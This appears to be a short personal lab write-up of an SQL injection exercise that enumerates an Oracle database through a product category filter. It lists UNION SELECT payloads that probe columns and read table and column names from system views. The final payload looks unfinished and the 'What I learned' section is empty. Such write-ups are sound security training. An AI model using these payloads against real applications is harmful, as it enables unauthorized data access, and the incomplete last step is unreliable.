---
topic: SQL injection
level: Practitioner
time_spent: 15 mins
date: 23rd Nov, 2026
---

**Vulnerability:** 
SQL injection vulnerability in the product category filter.

**Payload:**
```
category='+UNION+SELECT+NULL,NULL+FROM+dual--
```
![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123.png)

```
category='+UNION+SELECT+'abs','asc'+FROM+dual--
```
![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123-1.png)

```
category='+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

![](SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle.md_Attachments/-20261123-2.png)

```
category='+UNION+SELECT+column_name,NULL+FROM+all_table+WHERE+table_name=''--
```






**What I learned:**